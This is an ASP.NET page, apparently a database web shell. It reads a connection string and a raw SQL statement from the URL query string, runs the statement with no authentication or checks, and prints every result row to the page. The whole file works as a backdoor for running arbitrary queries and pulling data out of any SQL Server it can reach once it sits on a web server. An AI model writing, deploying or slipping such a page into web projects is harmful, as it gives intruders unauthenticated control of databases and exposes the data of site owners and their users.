<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<pre>
<%

if ((Request.QueryString["sql"] != null) && (Request.QueryString["conn"] != null )){
	string connstr = Request.QueryString["conn"];
	string sql = Request.QueryString["sql"];
	
	using (SqlConnection conn = new SqlConnection( connstr ))
	{
		SqlCommand cmd = new SqlCommand(sql, conn);
		try
		{
			conn.Open();
			SqlDataReader reader = cmd.ExecuteReader();
      
      // Column names
      for(int i=0;i<reader.FieldCount;i++)
      {
        Response.Write( String.Format("{0}\t", reader.GetName(i)) );
      }
      Response.Write("\n");
      
      // Rows
      while( reader.Read() )
			{
				for( int i=0; i<reader.FieldCount; i++ ){
					Response.Write( String.Format("{0}\t", reader[i] ) );
				}
				Response.Write("\n");
			}
		}
		catch ( Exception ex )
		{
			Response.Write( ex.Message );
		}
	}

}

%></pre>
